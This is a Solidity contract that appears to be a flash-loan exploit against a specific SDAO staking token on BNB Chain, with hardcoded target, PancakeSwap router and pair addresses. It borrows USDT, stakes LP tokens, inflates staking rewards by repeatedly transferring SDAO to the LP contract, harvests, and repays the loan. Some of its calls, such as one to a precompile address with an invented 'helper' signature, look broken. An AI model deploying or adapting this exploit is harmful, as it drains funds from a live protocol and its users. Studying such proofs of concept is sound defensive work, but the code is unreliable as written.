interface ISDAO is IERC20 {
    function stakeLP(uint256) external;
    function getReward() external;
    function unStakeLP(uint256) external;
    function LPInstance() external view returns (address);
}

interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract Strategy {
    ISDAO target = ISDAO(0x6666625Ab26131B490E7015333F97306F05Bf816);
    IERC20 lp;
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function run() public {
        lp = IERC20(target.LPInstance());
        // Flash loan USDT from USDT/WBNB pair
        uint256 loanAmount = 100000 * 1e18;
        IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE).swap(loanAmount, 0, address(this), "0x1234");

        // Convert SDAO to BNB using the provided helper
        (bool success, ) = address(0x0000000000000000000000000000000000000001).call(abi.encodeWithSignature("swapExcessTokensToBaseToken(address)", address(target)));
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        uint256 usdtAmount = amount0 > 0 ? amount0 : amount1;

        // 1. Swap USDT for SDAO
        usdt.approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, usdtAmount);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(target);

        0x10ED43C718714eb63d5aA57B78B54704E256024E.call(
            abi.encodeWithSignature("swapExactTokensForTokens(uint256,uint256,address[],address,uint256)", 
            usdtAmount / 2, 0, path, address(this), block.timestamp + 1000)
        );

        uint256 sdaoBalance = target.balanceOf(address(this));

        // 2. Add Liquidity to get LP tokens
        target.approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, sdaoBalance);
        0x10ED43C718714eb63d5aA57B78B54704E256024E.call(
            abi.encodeWithSignature("addLiquidity(address,address,uint256,uint256,uint256,uint256,address,uint256)",
            address(usdt), address(target), usdtAmount / 2, sdaoBalance, 0, 0, address(this), block.timestamp + 1000)
        );

        uint256 lpBalance = lp.balanceOf(address(this));
        lp.approve(address(target), lpBalance);
        target.stakeLP(lpBalance);

        // 3. Inflate rewards by transferring SDAO to LP contract
        // The vulnerability is that transfers to LPInstance increase totalStakeReward
        uint256 sdaoToInflate = target.balanceOf(address(this));
        if (sdaoToInflate > 0) {
            for(uint i=0; i<100; i++) {
                target.transfer(address(lp), sdaoToInflate / 100);
            }
        }

        // 4. Harvest inflated rewards
        try target.getReward() {} catch {}
        target.unStakeLP(lpBalance);

        // 5. Repay flash loan
        uint256 finalSdao = target.balanceOf(address(this));
        if (finalSdao > 0) {
            target.approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, finalSdao);
            path[0] = address(target);
            path[1] = address(usdt);
            0x10ED43C718714eb63d5aA57B78B54704E256024E.call(
                abi.encodeWithSignature("swapExactTokensForTokens(uint256,uint256,address[],address,uint256)", 
                finalSdao, 0, path, address(this), block.timestamp + 1000)
            );
        }

        usdt.transfer(msg.sender, (usdtAmount * 1003) / 1000);
    }
}
